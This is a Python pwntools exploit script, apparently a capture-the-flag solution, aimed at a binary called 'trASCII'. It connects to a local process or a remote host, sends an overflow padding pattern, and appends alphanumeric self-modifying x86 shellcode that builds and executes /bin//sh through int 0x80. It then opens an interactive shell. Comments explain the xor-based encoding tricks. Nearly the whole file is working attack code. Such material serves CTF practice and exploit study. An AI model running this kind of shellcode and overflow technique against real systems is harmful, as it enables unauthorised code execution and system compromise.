#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './trASCII'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
# prdi = 
# elf, libc
def convert(encode):
    key = []
    for i in encode:
        if i in string.ascii_letters+'[':
            key.append(i)
    tmp = encode
    for i in key:
        tmp=tmp.replace(i,'@')
    num = tmp.split('@')[1:]
    print key
    print num
    res = [key[i]*eval(num[i]) for i in range(len(key))]
    return ''.join(res)

# shellcode
nop = 'P5L1U1X3B2'
nop10 = 'P5L1U1X2J2'
shellcode = ''
shellcode+= 'j1X41H40f56b40f57Z40f53G40h4Y1P40Z40Y1B2' # int 0x80 -> [edx+0x32]
shellcode+= 'h1b11X5b1i15b11n2J2H2J2H'+'40h2Z1P40[1C2' # /bin -> [ebx+0x32]
shellcode+= 'h1w11X5w1A151X2P5X118'+'Y1C6Y40' # //sh -> [ebx+0x36]
shellcode+= 'C2K2'*0x32 # inc ebx -> /bin//sh
shellcode+= 'j4X4t' # eax=64
shellcode+= '2J8H'*53 + '2J2' # dec eax -> 0xb
shellcode+= nop10*1 
shellcode+= 'P41j1X41P41Y41P41Z41X'+'2K2' # ecx<-0 edx<-0

payload = '0000000000'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasPPPPWP'
payload += 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaBB'
payload += convert(shellcode)

ru('What garbage do you have for us today?\n')
# debug('b *0x80493c9')
sl(payload)
# h4W1P - push   0x50315734                # + pop eax -> init eax
# 5xxxx - xor    eax, xxxx                 # xor to get string
# j1X41 - eax <- 0                         # clear eax
# 1B2   - xor    DWORD PTR [edx+0x32], eax # assign value to shellcode
# 2J2   - xor    cl, BYTE PTR [edx+0x32]   # nop
# 41    - xor al, 0x31                     # nop
# X     - pop    eax
# P     - push   eax
p.interactive()

